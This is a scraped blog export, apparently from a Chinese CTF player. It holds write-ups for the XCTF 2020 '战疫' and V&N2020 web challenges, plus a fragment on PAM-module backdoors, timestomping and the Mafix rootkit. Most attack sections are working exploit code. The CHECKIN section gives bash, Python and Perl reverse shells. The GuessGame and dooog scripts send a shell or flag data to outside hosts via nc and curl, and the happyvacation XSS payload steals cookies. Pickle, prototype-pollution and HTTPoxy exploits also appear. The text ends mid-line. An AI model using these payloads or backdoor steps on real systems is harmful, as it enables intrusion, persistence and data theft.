pam_unix.so&#x2F;usr&#x2F;lib64&#x2F;security&#x2F;pam_unix.so 12cd &#x2F;usr&#x2F;lib64&#x2F;security&#x2F;pam_unix.somv pam_unix.so&#123;,.bak&#125; 复制新PAM模块到/usr/lib64/security/目录下： 1cp &#x2F;root&#x2F;Linux-PAM-1.1.8&#x2F;modules&#x2F;pam_unix&#x2F;.libs&#x2F;pam_unix.so &#x2F;usr&#x2F;lib64&#x2F;security&#x2F; 修改pam模块时间属性 1touch -t 201804111122 pam_unix.so 前面都没问题，但是最后连接不上。。。 排查技巧 1234567# 1、通过Strace跟踪sshps axu | grep sshdstrace -o aa -ff -p PIDgrep open aa* | grep -v -e No -e null -e denied| grep WR# 2、检查pam_unix.so的修改时间stat &#x2F;lib&#x2F;security&#x2F;pam_unix.so #32位stat &#x2F;lib64&#x2F;security&#x2F;pam_unix.so #64位 10、rookit后门 Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。 利用方法：安装完成后，使用ssh 用户@IP -P 配置的端口，即可远程登录。 我本地测试了下，直接报错了， 64位系统中安装了32位程序解决办法 是因为64位系统中安装了32位程序 解决方法： 代码如下 复制代码 yum install glibc.i686 问题二，解决交叉编译环境错误 # 1yum install glibc.i686 centos6起/etc/syslog.conf不再有！而是/etc/rsyslog.conf代替！ 仍然有几个错误无法解决，但是网上流传的大多是这个版本。。 关于rookit需要继续探索。 参考链接： https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=2448904990&amp;idx=1&amp;sn=9d5ed78f2d760540e4a40e5e9bb29048&amp;chksm=8b55c343bc224a55998647ff96c8e96a81fa128f2d32c6d95e0e83e1cde1a5b996612b52333a&amp;scene=126&amp;sessionid=1583909254&amp;key=8eee0b50946f7fa18c094b8a6874c7b06957421cd93368879b6f05c195994e2fd058437935c4fc42c9c748d7f973843bc7ac101fc59b6016f6d14860397b7d6d10e0dd011612fd7cb274951496f98813&amp;ascene=1&amp;uin=NzY4MzU5NDcy&amp;devicetype=Windows+10&amp;version=62080074&amp;lang=zh_CN&amp;exportkey=AR76JlF7ukKA%2B%2FrHmZNLPg4%3D&amp;pass_ticket=DQ6PMsSqx8syDl1t9nL1Y2s5T9VMq8kFaoEXTwcSMOZoXARa3QjAHcL6ZTfCpZ63 https://blog.51cto.com/huangzp/1911767 https://www.cnblogs.com/beautiful-code/p/9441757.html","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://glotozz.github.io/tags/Linux/"}]},{"title":"XCTF高校战“疫”网络安全分享赛","slug":"高校战“疫”网络安全分享赛","date":"2020-03-08T12:02:35.000Z","updated":"2020-03-11T06:46:46.506Z","comments":true,"path":"2020/03/08/高校战“疫”网络安全分享赛/","link":"","permalink":"https://glotozz.github.io/2020/03/08/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 sqlcheckin webtmp fmkq nweb UAF-PHP webct easy_trick_gzmtu hackme GuessGame NothardWeb dooog baby_java happyvacation hardphp easyweb 总结： 参考链接： sqlcheckin代码没有进行转义，过滤了很多，下面的万能密码可以 1234admin&#39;-0-&#39;1&#39;-&#39;1&#39;&amp;&#39;1 除了开头是非零数的字符串，其他字符串化成整数都为0，字符串=0为真，当所有username里没有开头是0的字符串，username=0相当于查全部数据 webtmp过滤了R 从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 一开始考虑RCE 1b&#39;\\x80\\x03c__main__\\nAnimal\\n)\\x81&#125;(V__setstate__\\ncos\\nsystem\\nubVls &#x2F;\\nb0c__main__\\nAnimal\\n)\\x81&#125;(X\\x04\\x00\\x00\\x00nameq\\x03X\\x14\\x00\\x00\\x00\\xe4\\xb8\\x80\\xe7\\xbb\\x99\\xe6\\x88\\x91\\xe5\\x93\\xa9giaogiaoq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x04\\x00\\x00\\x00Giaoq\\x06ub.&#39; 提示global XX，应该是因为raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))，后来考虑改写secret对象 secret.py 1secret &#x3D; &#123;&#39;name&#39;:&#39;xx&#39;,&#39;category&#39;:&#39;yy&#39;&#125; exp.py 12345678910import pickleimport pickletoolsimport secretclass Animal: def __init__(self): self.name = 'aa' self.category = 'bb's = b'\\x80\\x03c__main__\\nsecret\\n&#125;(Vname\\nVaa\\nVcategory\\nVbb\\nub0c__main__\\nAnimal\\n)\\x81&#125;(X\\x04\\x00\\x00\\x00nameX\\x02\\x00\\x00\\x00aaX\\x08\\x00\\x00\\x00categoryX\\x02\\x00\\x00\\x00bbub.'l = pickle.loads(s)pickletools.dis(s) base64编码即可 fmkq绕过head： \\ 绕过format： %1$s 8080端口api，考虑ssrf 尝试了各种payload： 1127.0.0.1:8080&#x2F;read&#x2F;file&#x3D;&#x2F;tmp&#x2F;..&#x2F;*&#x2F;flag%26vipcode&#x3D;0 最后队里一个师傅搞到了vipcode {file.vip.__dict__} 之后虽然找到了flag路径，但是提示nonono，需要读取源码 /app/app.py 1234567891011121314151617181920212223242526272829303132333435363738import webfrom urllib.parse import unquotefrom base.readfile import *urls = ( '/', 'help', '/read/(.*)','read')web.config.debug = Falseclass help: def GET(self): help_information = ''' Welcome to our FMKQ api, you could use the help information below To read file: /read/file=example&amp;vipcode=example if you are not vip,let vipcode=0,and you can only read /tmp/&#123;file&#125; Other functions only for the vip!!! ''' return help_informationclass read: def GET(self,text): file2read = readfile(text) if file2read.test() == False: return \"error\" else: if file2read.isvip() == False: return (\"The content of \"+ file2read.GetFileName() +\" is &#123;file&#125;\").format(file=file2read) else: vipfile2read = vipreadfile(file2read) return (str(vipfile2read))if __name__ == \"__main__\": app = web.application(urls, globals()) app.run() /app/base/vip.py就是验证码的 /app/base/readfile.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394from .vip import vipimport reimport osclass File: def __init__(self,file): self.file = file def __str__(self): return self.file def GetName(self): return self.fileclass readfile(): def __str__(self): filename = self.GetFileName() if '..' in filename or 'proc' in filename: return \"quanbumuda\" else: try: file = open(\"/tmp/\" + filename, 'r') content = file.read() file.close() return content except: return \"error\" def __init__(self, data): if re.match(r'file=.*?&amp;vipcode=.*?',data) != None: data = data.split('&amp;') data = &#123; data[0].split('=')[0]: data[0].split('=')[1], data[1].split('=')[0]: data[1].split('=')[1] &#125; if 'file' in data.keys(): self.file = File(data['file']) if 'vipcode' in data.keys(): self.vipcode = data['vipcode'] self.vip = vip() def test(self): if 'file' not in dir(self) or 'vipcode' not in dir(self) or 'vip' not in dir(self): return False else: return True def isvip(self): if self.vipcode == self.vip.GetCode(): return True else: return False def GetFileName(self): return self.file.GetName()current_folder_file = []class vipreadfile(): def __init__(self,readfile): self.filename = readfile.GetFileName() self.path = os.path.dirname(os.path.abspath(self.filename)) self.file = File(os.path.basename(os.path.abspath(self.filename))) global current_folder_file try: current_folder_file = os.listdir(self.path) except: current_folder_file = current_folder_file def __str__(self): if 'fl4g' in self.path: return 'nonono,this folder is a secret!!!' else: output = '''Welcome,dear vip! Here are what you want:\\r\\nThe file you read is:\\r\\n''' filepath = (self.path + '/&#123;vipfile&#125;').format(vipfile=self.file) output += filepath output += '\\r\\n\\r\\nThe content is:\\r\\n' try: f = open(filepath,'r') content = f.read() f.close() except: content = 'can\\'t read' output += content output += '\\r\\n\\r\\nOther files under the same folder:\\r\\n' output += ' '.join(current_folder_file) return output 需要绕过黑名单 12if &#39;fl4g&#39; in self.path: return &#39;nonono,this folder is a secret!!!&#39; 我们传入的是readfile 12345678def GetName(self): return self.filedef GetFileName(self): return self.file.GetName()self.filename = readfile.GetFileName()self.path = os.path.dirname(os.path.abspath(self.filename))filepath = (self.path + '/&#123;vipfile&#125;').format(vipfile=self.file) 分析下汪汪汪师傅的payload http://127.0.0.1:8080/read/file=/{vipfile.file[0]}l4g_1s_h3re_u_wi11_rua/flag 本地搭建下 123filepath &#x3D; (&#39;C:\\\\&#123;vipfile.file[0]&#125;l4g_1s_h3re_u_wi11_rua&#x2F;&#123;vipfile&#125;&#39;).format(vipfile&#x3D;self.file)&#x3D;&gt;filepath &#x3D; (&#39;C:\\\\fl4g_1s_h3re_u_wi11_rua&#39; + &#39;&#x2F;flag&#39;) format()是可以传入对象的，这里传入的self.file是file对象，file.file是{str}&#39;flag&#39;，因此vipfile.file[0]就是f，至于{vipfile}，就是def __str__(self):返回的字符串 最后举个简单的例子 ==================分割线 补充下前面ssti的探测过程，当时不知道为啥没测出来 1&#123;file.__class__&#125; 1&#123;file.__class__.__init__.__globals__&#125; 发现file下有个vip 1&#123;file.vip.class.init.globals&#125; nweb根据html提示110，修改type，成功注册 之后是sql注入，报500，猜测是替换为空，双写绕过，得到一半flag 提示Rogue-MySql-Server，给了账号密码，登录admin发现可以mysql恶意服务端读取 UAF-PHPPHP7.4，但是未开启FFI 1apache_child_terminate,apache_setenv,chgrp,chmod,chown,curl_exec,curl_multi_exec,dl,exec,imap_mail,imap_open,ini_alter,ini_restore,ini_set,link,mail,openlog,parse_ini_file,passthru,pcntl_alarm,pcntl_exec,pcntl_fork,pcntl_setpriority,pcntl_signal,pcntl_signal_dispatch,pcntl_sigprocmask,pcntl_sigtimedwait,pcntl_sigwaitinfo,pcntl_wait,pcntl_waitpid,pcntl_wstopsig,pcntl_wtermsig,popen,posix_kill,proc_get_status,proc_open,proc_terminate,putenv,readlink,shell_exec,symlink,syslog,system 1open_basedir &#x2F;var&#x2F;www&#x2F;html:&#x2F;tmp 用这个php7.0-7.4的exp https://raw.githubusercontent.com/mm0r1/exploits/master/php7-backtrace-bypass/exploit.php?tdsourcetag=s_pctim_aiomsg 沙箱有点问题，最后放tmp目录下再包含才成功 webct上传phar.gif，利用mysql服务端恶意读取文件触发phar:// 记录一个小坑，PHP的配置一般是常量，因此可以打印下从而解决直接传MYSQLI_OPT_LOCAL_INFILE传输后变字符串的问题 12345678&lt;?php $m = new mysqli('117.78.1.xxx','root','root'); if($m-&gt;connect_error)&#123; die($m-&gt;connect_error); &#125; var_dump(MYSQLI_OPT_LOCAL_INFILE); $m-&gt;options(MYSQLI_OPT_LOCAL_INFILE,1); $result=$m-&gt;query('select 1;'); option传8即可 easy_trick_gzmtu每个字母前添加\\即可，成功得到 url： /eGlhb2xldW5n username： admin password： 20200202goodluck 登录后存在文件读取，绕过本地 1url&#x3D;file:&#x2F;&#x2F;localhost&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php index.php 123456789&lt;?phpinclude('conn.php');error_reporting(0);$time = date($_GET['time']);$sql = \"select * from `content` where `createtime` = '$time' \";$r = $conn-&gt;query($sql);$content = $r-&gt;fetch_array(MYSQL_ASSOC);?&gt; https://www.php.net/manual/zh/function.date.php 在格式字串中的字符前加上反斜线来转义可以避免它被按照上表解释。 eGlhb2xldW5n/check.php 123456789101112131415161718&lt;?phpinclude(\"../conn.php\");if(empty($_SESSION['login']))&#123; die('请登录!');&#125;if(isset($_GET['url']))&#123;$url = $_GET['url'];$parts = parse_url($url);if(empty($parts['host']) || $parts['host'] != 'localhost') &#123; die('请从本地访问');&#125; if(!preg_match(\"/flag|fl|la|ag|fla|lag|log/is\", $parts['path']))&#123; readfile($url); &#125;else&#123; die('不要搞这些奇奇怪怪的东西。'); &#125;&#125; 这里是$parts = parse_url($url); https://www.php.net/manual/zh/function.parse-url.php /eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpclass trick&#123; public $gf; public function content_to_file($content)&#123; $passwd = $_GET['pass']; if(preg_match('/^[a-z]+\\.passwd$/m',$passwd)) &#123; if(strpos($passwd,\"20200202\"))&#123; echo file_get_contents(\"/\".$content); &#125; &#125; &#125; public function aiisc_to_chr($number)&#123; if(strlen($number)&gt;2)&#123; $str = \"\"; $number = str_split($number,2); foreach ($number as $num ) &#123; $str = $str .chr($num); &#125; return strtolower($str); &#125; return chr($number); &#125; public function calc()&#123; $gf=$this-&gt;gf; if(!preg_match('/[a-zA-z0-9]|\\&amp;|\\^|#|\\$|%/', $gf))&#123; eval('$content='.$gf.';'); $content = $this-&gt;aiisc_to_chr($content); return $content; &#125; &#125; public function __destruct()&#123; $this-&gt;content_to_file($this-&gt;calc()); &#125; &#125;unserialize((base64_decode($_GET['code'])));?&gt; 绕过正则用%0a，两位的限制，它最后有个tolowercase()，可以用大写绕过， 字母的过滤，利用取反操作 12345a = 'FLAG'res = ''for i in a: res += str(ord(i))print(res) 123456789101112&lt;?phpclass trick&#123; public $gf;&#125;$s = \"70766571\";$s = urlencode(~$s);$a = new trick();$a-&gt;gf = urldecode('~'.$s);echo base64_encode(serialize($a));//另一种写法//$a = new trick();//$a-&gt;gf = '~'.(~'70766571'); 1Tzo1OiJ0cmljayI6MTp7czoyOiJnZiI7czo5OiJ+yM&#x2F;IycnKyM4iO30&#x3D; url编码下即可 =================================分割线 上面是做过的 =================================分割线 hackme session.serialize_handler误用导致的反序列化问题： https://www.cnblogs.com/sijidou/p/10455646.html 绕过代码中给出的限制参考bytectf原题：四字符写shell写shell后cat /flag 1compress.zlib:&#x2F;&#x2F;data:@127.0.0.1&#x2F;baidu.com?,ls GuessGame1234567if(config.enableReg &amp;&amp; noDos(regExp) &amp;&amp; flag.match(regExp))&#123; //res.end(flag); //Stop your wishful thinking and go away!&#125;if(req.query.q === flag) result+=flag;res.end(result); 原型链污染 1&#123;\"user\":&#123;\"username\":\"admın888\",\"__proto__\": &#123;\"enableReg\": True&#125;&#125;&#125;) 50行使用regExp来匹配flag，regExp可控，因此可以构造特殊表达式控制匹配时间 假设flag为：flag{klasdfjasfasdfadffsdfas} 构造var reg = /^flag{(((([a-zA-Z0-9]+)+)+)+)+1$/ 匹配的时间会相当长 再构造var reg = /^flag{a(((([a-zA-Z0-9]+)+)+)+)+1$/匹配时间会很短（匹配到k!=a会直接结束）因此可以通过匹配时间来判断flag，但是还没太想好 秘笈！手工盲注！ ====================分割线 emm自己本地搭了个 12345678910111213141516171819var express = require('express');var app = express();var flag = \"flag&#123;klasdfjasfasdfadffsdfas&#125;\";app.get('/', function (req, res) &#123; let regExp = req.query.q; console.log(regExp); console.log(flag); if(flag.match(regExp))&#123; &#125; res.send('ok');&#125;)var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(\"应用实例，访问地址为 http://%s:%s\", host, port)&#125;) 下面的payload测试成功 1^(?&#x3D;xx)(.*)*aaaaa$ &#x2F;&#x2F;xxx匹配上会延时，并且结尾不能是aaaaa =================分割线 看了vn的wp，直接rce，当时也有点疑问，被污染的参数明明会触发，为啥不能rce。。。 v&amp;n的脚本 123456789101112import requeststheips = [\"http://121.37.179.47:8081/\",\"http://121.37.167.12:80\",\"http://121.37.167.12:81\",\"http://121.37.167.12:82\"]proxies=&#123;\"http\":\"http://localhost:4476\"&#125;while 1: for i in theips: try: requests.post(i,json=&#123;\"user\":&#123;\"username\":\"admIn888\",\"__proto__\":&#123;\"enableReg\":True,\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('rm /tmp/fa;mkfifo /tmp/fa;cat /tmp/fa|/bin/sh -i 2&gt;&amp;1|nc 106.14.15.50 1234 &gt; /tmp/fa ');var __tmp2\"&#125;&#125;&#125;,timeout=1,proxies=proxies) requests.get(i,timeout=1,proxies=proxies) except: pass NothardWebcbc字节翻转攻击，对于已知明文和密文，即可构造我们需要的明文对应的密文 分析明文和密文，因为是明文最后需要反序列化，因此cbc字节翻转攻击需要iv，思路是利用cbc选择密文攻击得到iv，但是好像又不行，似乎需要控制任意明文才行 ================分割线 因为key生成的方式strval(mt_rand() &amp; 0x5f5e0ff)， 0x5f5e0ff = 0b101111101011110000011111111，19个1有54w多种情况，带入解码如果正确解码说明key是正确的 de1ta的脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?php$cccc=\"%d0%d%d%d%d%d0%d0%d%d%d%d00000%d%d%d%d%d%d%d%d\";for ($a=0; $a &lt; 2; $a++) &#123; for ($b=0; $b &lt; 2; $b++) &#123; for ($c=0; $c &lt; 2; $c++) &#123; for ($d=0; $d &lt; 2; $d++) &#123; for ($e=0; $e &lt; 2; $e++) &#123; for ($f=0; $f &lt; 2; $f++) &#123; for ($g=0; $g &lt; 2; $g++) &#123; for ($h=0; $h &lt; 2; $h++) &#123; for ($i=0; $i &lt; 2; $i++) &#123; for ($j=0; $j &lt; 2; $j++) &#123; for ($k=0; $k &lt; 2; $k++) &#123; for ($l=0; $l &lt; 2; $l++) &#123; for ($m=0; $m &lt; 2; $m++) &#123; for ($n=0; $n &lt; 2; $n++) &#123; for ($o=0; $o &lt; 2; $o++) &#123; for ($p=0; $p &lt; 2; $p++) &#123; for ($q=0; $q &lt; 2; $q++) &#123; for ($r=0; $r &lt; 2; $r++) &#123; for ($s=0; $s &lt; 2; $s++) &#123; $f_key=sprintf($cccc,$a,$b,$c,$d,$e,$f,$g,$h,$i,$j,$k,$l,$m,$n,$o,$p,$q,$r,$s); $key=base_convert($f_key,2,10); $result=decode_aes($key); if(stripos($result,\"guest\"))&#123; echo $result; echo $key.\"\\n\"; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125;&#125;function decode_aes($key)&#123; $ch=base64_decode(\"NGtWc0JCQ080dkNxcnhtVjVOSG1rQ3hWckRab3pjWkllTmdJMmovclR4YktzNk9FTERBSnYxSUNKVmQ4Qk55Qg==\"); $de = openssl_decrypt($ch,\"des-cbc\",$key,0,\"abcdabcd\"); return $de;&#125;?&gt; 遍历得到的key异或还原出iv，然后再和hash比较，找出正确的iv 12345678&lt;?php$key = strval(94675148);//每次会变$p = openssl_decrypt($cipher, 'des-cbc', $key, 0, $iv);print_r($p.\"&lt;br/&gt;\");$iv = \"\";for ($i = 0; $i &lt; 8; $i++) &#123;·//还原iv就是和密文和第一组明文进行异或 $iv .= chr(ord($p[$i]) ^ ord($plain[$i]));&#125; 非预期：但是因为这里的iv和key是保存在session中，shana师傅直接删除sessionid，那么就都为空了 1$sessionUser &#x3D; base64_encode(openssl_encrypt($user, &#39;des-cbc&#39;, &#39;&#39;, 0, &#39;&#39;)); 之后是个tomcat的PUT方法传shell的漏洞，传个ew代理 =========================分割线 vp的wp还有另一种思路 浏览题目，初步分析此处为 mt_rand 特性，第一次访问时可以拿到 第一次，第 227，228 次生成的随机数，爆破随机数种子之后可以得到 第 229 个随机数，得到密钥。 dooogcmd有很明显的逻辑漏洞，可以绕过对cmd的判断 1234if int(time.time()) - data[&#39;timestamp&#39;] &lt; 60: if cmd not in [&#39;whoami&#39;, &#39;ls&#39;]: return &#39;cmd error&#39;... 简单分析下源码 在/getTGT中，用(username + &#39;|&#39; + session_key + &#39;|&#39; + str(int(time.time())))生成TGT的KEY我们不知道，但是知道加密结果TGT，用session_key生成session_key_enc的KEY我们是我们可控的master_key， 在/getTicket中， 123cryptor &#x3D; AESCipher(app.config.get(&#39;SECRET_KEY&#39;))auth_data &#x3D; cryptor.decrypt(base64.b64decode(TGT)).split(&#39;|&#39;)cryptor &#x3D; AESCipher(auth_data[1]) 发现生成authenticator的KEY就是session_key，之后session_key2生成client_message的KEY也是session_key，生成server_message的KEY是master_key 最后， 1234client_message, server_message &#x3D; res.content.split(&#39;|&#39;)session_key &#x3D; cryptor.decrypt(base64.b64decode(client_message))cryptor &#x3D; AESCipher(session_key)authenticator &#x3D; base64.b64encode(cryptor.encrypt(username)) 对authenticator进行加密的KEY是session_key2。 然后就可以写脚本了。抄一下作业 12345678910111213141516171819202122232425from toolkit import AESCipherimport osimport requestsimport jsonimport timeimport base64import requestscryptor = AESCipher('00000000')authenticator = cryptor.encrypt(json.dumps(&#123;'username':'Q7','timestamp':int(time.time())&#125;))au = base64.b64encode(authenticator)print autgt = requests.post('http://121.37.164.32:5001/getTGT',data=&#123;'username':'Q7','authenticator': au&#125;).contentprint tgtsession_key, tgt = cryptor.decrypt(base64.b64decode(tgt.split('|')[0])), tgt.split('|')[1]cryptor = AESCipher(session_key)authenticator = base64.b64encode(cryptor.encrypt(json.dumps(&#123;'username': 'Q7','timestamp': int(time.time())-100&#125;)))res = requests.post('http://121.37.164.32:5001/getTicket', data=&#123;'username': 'Q7', 'authenticator': authenticator, 'TGT':tgt, 'cmd': '''curl q71998.cn:2333 -d `/readflag` '''&#125;).contentprint resclient_message, server_message = res.split('|')session_key = cryptor.decrypt(base64.b64decode(client_message))cryptor = AESCipher(session_key)authenticator = base64.b64encode(cryptor.encrypt(\"Q7\"))res = requests.post('http://121.37.164.32:5002/cmd',data=&#123;'server_message': server_message, 'authenticator':authenticator&#125;).contentprint res baby_javaxxe读取hint.txt 依赖里有fastjson，版本为1.2.48，可以利用这个版本的反序列化漏洞 而prefix是想考fastjson会自动处理 - 和_ 的特性，在fastjson中， parseField 这个函数里会去掉字符串中的 - 和开头的下划线，因此带个 - 就可以了 happyvacation还没看题就被队友秒了🤦‍♂️， 有个非预期，利用下面的将上传黑名单置为false，从而上传任意后缀文件 1eval(&quot;\\$this-&gt;&quot;.$answer.&quot; &#x3D; false;&quot;); 控制header头，设置为gbk，可以利用宽字节使单引号逃逸。从而xsshttp://159.138.4.209:1002/quiz.php?referer=Content-Type: text/html; charset=GBK; Referer: index&amp;answer=user-&gt;url-&gt;pre payload: 1&#96;1%aa&#39;;var d&#x3D;String.fromCharCode(100,111,99,117,109,101,110,116);var c &#x3D;String.fromCharCode(99,111,111,107,105,101);var w&#x3D;String.fromCharCode(119,105,110,100,111,119);var o&#x3D;String.fromCharCode(111,112,101,110);var ip &#x3D; String.fromCharCode(47,47,52,55,46,50,52,48,46,52,56,46,52,50,58,50,51,51,51,47);self[w].open(ip%2bself[d][c]);&#x2F;&#x2F;&#96; hardphp第一步去混淆。 easyweb用下面的包能读取文件，wp没解释。。。 1234567891011121314151617POST &#x2F;createmd?operate&#x3D;file&amp;isConvert&#x3D;true HTTP&#x2F;1.1Host: 121.36.222.22:801User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;62.0.3202.9 Safari&#x2F;537.36Accept: *&#x2F;*Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3Accept-Encoding: gzip, deflateContent-Type: text&#x2F;plainReferer: http:&#x2F;&#x2F;121.36.222.22:801&#x2F;profile.jspContent-Length: 39Cookie: JSESSIONID&#x3D;A33FFBFC70E5BF80F9D1E212F7C6402C;session_id&#x3D;7b0e89e7d9943a4581d96c705d3084537b12fceeX-Forwarded-For: 127.0.0.1Connection: close![](http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;profile.jsp) start.sh 再看到 /home/tomcat/webapps/ROOT/WEB-INF/libs/ 下 Common Collections 为 3.1，有漏洞。 再根据题目提示的端口 2078, 然后就可以在本地构造一个 RMI 客户端，调用上面这个方法，实施反序列化。 总结：做题还是得想想考点是啥，不要一味死磕。 短板还是辣么多。 nepnep的师傅们tql👅 参考链接： https://wx.zsxq.com/dweb2/index/group/824215518412 https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247484827&amp;idx=1&amp;sn=08a52b82dd04c37c17c08bcc85dc42de&amp;chksm=fd7110d6ca0699c02196923e2e95f77fbe5048dd023eba473fc391d7f97afde9f0bb7a6cdd93&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1583814055793&amp;sharer_shareid=0ed84c079a78a485e04fa50e826c0770#rd https://blog.de1ta.club/2020/03/10/XCTF%3CZHANYI%3E-2020/?nsukey=IRbrIReu2wgWelMKXIRg4GOxeF%2BLe8ryMZZza8bY%2B5UgrdvTaFVYAQQuqITVkIY%2F3qZZr53BXziZp0BnYjDfHN9KclyHbOpnuX%2F58pz3L1BhHsLZFkkkuhPAe67XBCpceGlpKo05X3R29J7qpnPi7I0QG7Vfn%2Fyrs2SCrbWEs%2F7mJImS4VdDc%2BLdt4vxOsgUV81pEMEh0mC5qAkz7Y92uA%3D%3D&amp;scene=2&amp;clicktime=1583836967&amp;enterid=1583836967&amp;from=timeline&amp;isappinstalled=0 https://mp.weixin.qq.com/s/RjTsvUsx65YTMIg3jejXng","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"V&N2020公开赛wp","slug":"V-N2020公开赛wp","date":"2020-03-02T14:06:02.000Z","updated":"2020-03-02T07:41:49.764Z","comments":true,"path":"2020/03/02/V-N2020公开赛wp/","link":"","permalink":"https://glotozz.github.io/2020/03/02/V-N2020%E5%85%AC%E5%BC%80%E8%B5%9Bwp/","excerpt":"前两天没打，补一补🤦‍♂️","text":"前两天没打，补一补🤦‍♂️ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 Happy-CTFd CHECKIN TimeTravel EasySpringMVC 参考链接： Happy-CTFdCTFd前些天出的漏洞，注册用户时判断用户是否存在的时候没有对两端空格进行处理，而插入数据库的时候去除了两端的空格。开个隐私窗口为新帐户启动密码重置，生成的token链接中对应了admin账户，我们先修改用户名为其他，再去邮箱重置admin帐户的密码。 CHECKIN123456789101112131415161718192021222324252627from flask import Flask, requestimport osapp &#x3D; Flask(__name__)flag_file &#x3D; open(&quot;flag.txt&quot;, &quot;r&quot;)# flag &#x3D; flag_file.read()# flag_file.close()## @app.route(&#39;&#x2F;flag&#39;)# def flag():# return flag## want flag? naive!# You will never find the thing you want:) I think@app.route(&#39;&#x2F;shell&#39;)def shell(): os.system(&quot;rm -f flag.txt&quot;) exec_cmd &#x3D; request.args.get(&#39;c&#39;) os.system(exec_cmd) return &quot;1&quot;@app.route(&#39;&#x2F;&#39;)def source(): return open(&quot;app.py&quot;,&quot;r&quot;).read()if __name__ &#x3D;&#x3D; &quot;__main__&quot;: app.run(host&#x3D;&#39;0.0.0.0&#39;) emmm，其实就考了一个知识点 在 linux 系统中如果一个程序打开了一个文件没有关闭，即便从外部（上文是利用 rm -f flag.txt）删除之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的 fd，通过这个我们即可得到被删除文件的内容。 类似的还有/proc/xxx/下的cwd是软链接，self表示本进程。当我们通过访问Apache运行的网站时，/proc/self/cwd/就相当于apache的根目录 如果有回显，直接cat /proc/*/fd/*即可，但是本题没有回显，需要反弹shell，这里提供3中反弹方式 1echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3NC4wLjIyMi4yMDMvMTIzNCAwPiYxCg&#x3D;&#x3D;|base64 -d|bash 1python3 -c &#39;mport socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;174.0.222.203&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&quot;&#x2F;bin&#x2F;sh&quot;,&quot;&quot;-i&quot;]);&#39; 1perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;174.0.222.203:1234&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39; TimeTravel12345678910111213141516171819202122232425 &lt;?phperror_reporting(0);require __DIR__ . '/vendor/autoload.php';use GuzzleHttp\\Client;highlight_file(__FILE__);if(isset($_GET['flag'])) &#123; $client = new Client(); $response = $client-&gt;get('http://127.0.0.1:5000/api/eligible'); $content = $response-&gt;getBody(); $data = json_decode($content, TRUE); if($data['success'] === true) &#123; echo system('/readflag'); &#125;&#125;if(isset($_GET['file'])) &#123; highlight_file($_GET['file']);&#125;if(isset($_GET['phpinfo'])) &#123; phpinfo();&#125; 存在文件读取，尝试/start.sh 开启了php-fpm，http://127.0.0.1:5000/api/eligible服务就是这个/srv/app.py提供的 123456789101112131415from flask import Flaskimport datetimeimport jsonapp = Flask(__name__)@app.route('/api/eligible')def source(): current_year = int(datetime.datetime.now().strftime(\"%Y\")) if current_year &lt; 2050: return json.dumps(&#123;\"success\": False&#125;) else: return json.dumps(&#123;\"success\": True&#125;)if __name__ == \"__main__\": app.run(host='127.0.0.1') 代码没有漏洞，只能利用中间件 HTTPoxy漏洞（CVE-2016-5385） 需要返回的json数据中为True，可得flag 传入一个 Proxy头，使其产生一个 HTTP_PROXY 环境变量，这个环境变量再被程序里的 GuzzleHttp 使用，即可使流量走代理，控制返回的请求。 vps开个服务，flask默认5000 1234567891011from flask import Flaskimport datetimeimport jsonapp = Flask(__name__)@app.route('/api/eligible')def source(): return json.dumps(&#123;\"success\": True&#125;)if __name__ == \"__main__\": app.run(host='127.0.0.1') 添加 Proxy: http://174.0.222.203:5000 但是Linux靶机没flask模块，用SimpleHTTPServer模块 1234567891011121314from http.server import BaseHTTPRequestHandler, HTTPServerimport jsonclass DemoHttpServer(BaseHTTPRequestHandler): def do_GET(self): self.send_response(200, message='OK') self.send_header('Content-Type', 'application/json') self.end_headers() self.wfile.write(json.dumps(&#123;\"success\": True&#125;).encode()) if __name__ == '__main__': server = HTTPServer(('0.0.0.0', 1234), DemoHttpServer) print('Server is running, user &lt;Ctrl+C&gt; to srop.') server.serve_forever() php也可，更方便 123$arr &#x3D; 